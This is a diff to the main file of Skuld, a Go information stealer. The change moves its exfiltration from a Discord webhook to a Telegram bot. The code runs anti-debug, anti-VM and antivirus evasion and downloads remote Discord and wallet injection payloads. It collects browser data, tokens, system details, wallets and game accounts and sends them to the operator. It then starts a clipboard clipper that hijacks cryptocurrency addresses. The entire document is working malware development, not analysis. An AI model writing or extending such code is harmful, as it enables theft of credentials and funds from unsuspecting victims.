@@ -1,6 +1,10 @@
 package main
 
 import (
+	"fmt"
+	"log"
+	"sync"
+
 	"github.com/hackirby/skuld/modules/antidebug"
 	"github.com/hackirby/skuld/modules/antivm"
 	"github.com/hackirby/skuld/modules/antivirus"
@@ -19,11 +23,13 @@ import (
 	"github.com/hackirby/skuld/modules/wallets"
 	"github.com/hackirby/skuld/modules/walletsinjection"
 	"github.com/hackirby/skuld/utils/program"
+	"github.com/hackirby/skuld/utils/collector"
 )
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"webhook": "",
+		"bot_token": "", // Telegram Bot Token
+		"chat_id":   "", // Telegram Chat ID
 		"cryptos": map[string]string{
 			"BTC": "",
 			"BCH": "",
@@ -37,6 +43,11 @@ func main() {
 			"DASH": "",
 			"DOGE": "",
 		},
+	}
+
+	// Validate Telegram configuration
+	if CONFIG["bot_token"].(string) == "" || CONFIG["chat_id"].(string) == "" {
+		log.Fatal("Please configure bot_token and chat_id in CONFIG")
 	}
 
 	if program.IsAlreadyRunning() {
@@ -57,17 +68,28 @@ func main() {
 	go antidebug.Run()
 	go antivirus.Run()
 
+	// Initialize data collector
+	dataCollector := collector.NewDataCollector(
+		CONFIG["bot_token"].(string),
+		CONFIG["chat_id"].(string),
+	)
+	defer dataCollector.Cleanup()
+
+	// Send startup message
+	dataCollector.SendMessage("🚀 Skuld started data collection...")
+
 	go discordinjection.Run(
 		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
-		CONFIG["webhook"].(string),
+		dataCollector,
 	)
 	go walletsinjection.Run(
 		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
 		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
-		CONFIG["webhook"].(string),
+		dataCollector,
 	)
 
-	actions := []func(string){
+	// Run data collection modules
+	actions := []func(*collector.DataCollector){
 		system.Run,
 		browsers.Run,
 		tokens.Run,
@@ -77,9 +99,26 @@ func main() {
 		games.Run,
 	}
 
+	var wg sync.WaitGroup
 	for _, action := range actions {
-		go action(CONFIG["webhook"].(string))
+		wg.Add(1)
+		go func(fn func(*collector.DataCollector)) {
+			defer wg.Done()
+			fn(dataCollector)
+		}(action)
 	}
 
+	// Wait for all data collection to complete
+	wg.Wait()
+
+	// Send all collected data
+	if err := dataCollector.SendCollectedData(); err != nil {
+		log.Printf("Failed to send collected data: %v", err)
+		dataCollector.SendMessage(fmt.Sprintf("❌ Error sending data: %v", err))
+	} else {
+		dataCollector.SendMessage("✅ Data collection completed successfully!")
+	}
+
+	// Start clipper (runs indefinitely)
 	clipper.Run(CONFIG["cryptos"].(map[string]string))
 }
